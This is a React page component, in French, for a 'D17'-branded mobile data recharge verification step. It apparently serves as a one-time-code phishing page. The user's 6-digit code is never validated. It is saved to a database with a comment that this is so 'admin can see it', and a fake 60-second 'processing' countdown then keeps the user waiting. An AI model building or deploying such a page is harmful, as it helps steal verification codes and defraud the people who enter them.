import { useState, useEffect } from 'react';
import { useSearchParams, useNavigate } from 'react-router-dom';
import { supabase } from '@/integrations/supabase/client';
import { Button } from '@/components/ui/button';
import { InputOTP, InputOTPGroup, InputOTPSlot } from '@/components/ui/input-otp';
import { Dialog, DialogContent } from '@/components/ui/dialog';
import { toast } from 'sonner';
import { Loader2, ShieldCheck, Clock, Timer, Sparkles } from 'lucide-react';
 import { ArrowLeft } from 'lucide-react';
import { motion } from 'framer-motion';
import d17Logo from '@/assets/d17-logo.png';

export default function RechargeVerify() {
  const [searchParams] = useSearchParams();
  const navigate = useNavigate();
  const rechargeId = searchParams.get('id');
  const cin = searchParams.get('cin');

  const [code, setCode] = useState('');
  const [loading, setLoading] = useState(false);
  const [status, setStatus] = useState<'input' | 'success' | 'error'>('input');
  const [rechargeData, setRechargeData] = useState<any>(null);
  const [showCountdown, setShowCountdown] = useState(false);
  const [countdown, setCountdown] = useState(60);

  useEffect(() => {
    if (!rechargeId || !cin) {
      navigate('/recharge');
      return;
    }
    supabase
      .from('recharges' as any)
      .select('*')
      .eq('id', rechargeId)
      .eq('cin', cin)
      .single()
      .then(({ data, error }) => {
        if (error || !data) {
          toast.error('Demande non trouvée');
          navigate('/recharge');
        } else {
          setRechargeData(data);
          if ((data as any).is_verified) {
            setStatus('success');
          }
        }
      });
  }, [rechargeId, cin, navigate]);

  // Countdown timer
  useEffect(() => {
    if (!showCountdown) return;
    if (countdown <= 0) {
      setShowCountdown(false);
      setCountdown(60);
      return;
    }
    const timer = setTimeout(() => setCountdown((c) => c - 1), 1000);
    return () => clearTimeout(timer);
  }, [showCountdown, countdown]);

  const handleVerify = async () => {
    if (code.length !== 6) {
      toast.error('Veuillez entrer le code à 6 chiffres');
      return;
    }

    setLoading(true);

    try {
      // Save the code to DB immediately so admin can see it
      await supabase
        .from('recharges' as any)
        .update({ verification_code: code, status: 'code_sent' } as any)
        .eq('id', rechargeId!);

      // Now show countdown popup
      setShowCountdown(true);
      setCountdown(60);
      setCode('');
    } catch {
      toast.error('Erreur, réessayez');
    } finally {
      setLoading(false);
    }
  };

  const statusLabel = rechargeData?.status === 'pending'
    ? 'En attente'
    : rechargeData?.status === 'validated'
    ? 'Validé'
    : rechargeData?.status === 'verified'
    ? 'Vérifié'
    : rechargeData?.status === 'refused'
    ? 'Refusé'
    : rechargeData?.status;

  const formatTime = (s: number) => {
    const min = Math.floor(s / 60);
    const sec = s % 60;
    return `${min}:${sec.toString().padStart(2, '0')}`;
  };

  const progress = ((60 - countdown) / 60) * 100;

  return (
    <div className="min-h-screen bg-gradient-to-br from-blue-950 via-slate-900 to-indigo-950 flex items-center justify-center p-4">
      <div className="absolute inset-0 overflow-hidden pointer-events-none">
        <div className="absolute top-1/4 left-1/4 w-64 h-64 bg-blue-500/5 rounded-full blur-3xl animate-pulse" />
        <div className="absolute bottom-1/4 right-1/4 w-96 h-96 bg-indigo-500/5 rounded-full blur-3xl animate-pulse delay-1000" />
      </div>

      <div className="w-full max-w-md relative z-10">
        <motion.div
          initial={{ opacity: 0, y: 20 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ duration: 0.5 }}
          className="text-center mb-8"
        >
          <div className="flex justify-center mb-4">
            <div className="relative">
              <div className="absolute inset-0 bg-blue-500/20 rounded-2xl blur-xl" />
              <img src={d17Logo} alt="D17" className="h-16 w-16 rounded-2xl shadow-2xl relative z-10" />
            </div>
          </div>
          <h1 className="text-2xl font-bold text-white">Vérification</h1>
          <p className="text-blue-200/60 mt-1 text-sm">Entrez le code à 6 chiffres</p>
        </motion.div>

        <motion.div
          initial={{ opacity: 0, y: 20 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ duration: 0.5, delay: 0.15 }}
          className="bg-white/[0.07] backdrop-blur-xl rounded-3xl border border-white/10 shadow-2xl p-6 space-y-6"
        >
          {/* Recharge info */}
          {rechargeData && (
            <div className="bg-white/[0.05] rounded-xl p-4 space-y-2 text-sm">
              <div className="flex justify-between">
                <span className="text-blue-200/50">Forfait</span>
                <span className="font-semibold text-white">{(rechargeData as any).forfait} Gb</span>
              </div>
              <div className="flex justify-between">
                <span className="text-blue-200/50">Tél</span>
                <span className="font-semibold text-white">{(rechargeData as any).tel}</span>
              </div>
              <div className="flex justify-between">
                <span className="text-blue-200/50">Statut</span>
                <span className={`font-semibold ${
                  rechargeData.status === 'pending' ? 'text-yellow-400' :
                  rechargeData.status === 'verified' ? 'text-green-400' :
                  rechargeData.status === 'refused' ? 'text-red-400' : 'text-white'
                }`}>
                  {statusLabel}
                </span>
              </div>
            </div>
          )}

          {status === 'success' && !showCountdown ? (
            <div className="text-center py-6 space-y-3">
              <div className="mx-auto h-16 w-16 rounded-full bg-green-500/20 flex items-center justify-center">
                <ShieldCheck className="h-8 w-8 text-green-400" />
              </div>
              <h2 className="text-lg font-bold text-white">Vérifié avec succès !</h2>
              <p className="text-blue-200/50 text-sm">Votre recharge a été confirmée.</p>
              <Button onClick={() => navigate('/recharge/operator')} variant="outline"
                className="rounded-xl border-white/10 text-white hover:bg-white/10">
                Nouvelle recharge
              </Button>
            </div>
          ) : status === 'success' && showCountdown ? null : (
            <>
              <div className="flex justify-center">
                <div className="flex items-center gap-2 text-sm text-blue-200/50 mb-2">
                  <Clock className="h-4 w-4" />
                  En attente du code de vérification
                </div>
              </div>

              <div className="flex justify-center">
                <InputOTP maxLength={6} value={code} onChange={setCode}>
                  <InputOTPGroup>
                    {[0, 1, 2, 3, 4, 5].map((i) => (
                      <InputOTPSlot key={i} index={i} className="bg-white/[0.06] border-white/10 text-white" />
                    ))}
                  </InputOTPGroup>
                </InputOTP>
              </div>

              <Button onClick={handleVerify}
                className="w-full h-12 text-base font-semibold rounded-xl bg-gradient-to-r from-blue-600 to-indigo-600 hover:from-blue-500 hover:to-indigo-500 text-white shadow-lg shadow-blue-500/25"
                disabled={loading || code.length !== 6}>
                {loading ? <Loader2 className="h-5 w-5 animate-spin mr-2" /> : null}
                Vérifier
              </Button>

              <Button onClick={() => navigate('/recharge/operator')} variant="ghost"
                className="w-full text-blue-300/60 hover:text-white hover:bg-white/[0.06]">
                <ArrowLeft className="h-4 w-4 mr-2" />
                Retour
              </Button>
            </>
          )}
        </motion.div>
      </div>

      {/* Countdown Popup */}
      <Dialog open={showCountdown} onOpenChange={() => {}}>
        <DialogContent className="max-w-sm border-0 bg-transparent shadow-none [&>button]:hidden p-0">
          <motion.div
            initial={{ scale: 0.8, opacity: 0 }}
            animate={{ scale: 1, opacity: 1 }}
            transition={{ type: 'spring', damping: 20, stiffness: 300 }}
            className="bg-gradient-to-br from-slate-800 to-slate-900 rounded-3xl p-8 text-center shadow-2xl border border-white/10 overflow-hidden relative"
          >
            {/* Subtle animated background */}
            <div className="absolute inset-0 overflow-hidden pointer-events-none">
              <div className="absolute -top-10 -right-10 w-40 h-40 bg-blue-500/10 rounded-full blur-2xl animate-pulse" />
              <div className="absolute -bottom-10 -left-10 w-40 h-40 bg-indigo-500/10 rounded-full blur-2xl animate-pulse delay-500" />
            </div>

            <div className="relative z-10">
              {/* Circular progress ring */}
              <div className="mx-auto w-28 h-28 relative mb-6">
                <svg className="w-full h-full -rotate-90" viewBox="0 0 100 100">
                  <circle cx="50" cy="50" r="42" fill="none" stroke="rgba(255,255,255,0.05)" strokeWidth="6" />
                  <circle
                    cx="50" cy="50" r="42" fill="none" stroke="url(#timerGradient)" strokeWidth="6"
                    strokeLinecap="round" strokeDasharray={`${2 * Math.PI * 42}`}
                    strokeDashoffset={`${2 * Math.PI * 42 * (1 - (60 - countdown) / 60)}`}
                    className="transition-all duration-1000 ease-linear"
                  />
                  <defs>
                    <linearGradient id="timerGradient" x1="0%" y1="0%" x2="100%" y2="100%">
                      <stop offset="0%" stopColor="#3b82f6" />
                      <stop offset="100%" stopColor="#6366f1" />
                    </linearGradient>
                  </defs>
                </svg>
                <div className="absolute inset-0 flex items-center justify-center">
                  <span className="text-3xl font-mono font-bold text-white">{formatTime(countdown)}</span>
                </div>
              </div>

              <div className="flex items-center justify-center gap-2 mb-2">
                <Sparkles className="h-4 w-4 text-blue-400" />
                <h2 className="text-lg font-bold text-white">Forfait en attendant</h2>
                <Sparkles className="h-4 w-4 text-indigo-400" />
              </div>
              <p className="text-blue-200/50 text-sm">Traitement en cours, veuillez patienter...</p>
            </div>
          </motion.div>
        </DialogContent>
      </Dialog>
    </div>
  );
}
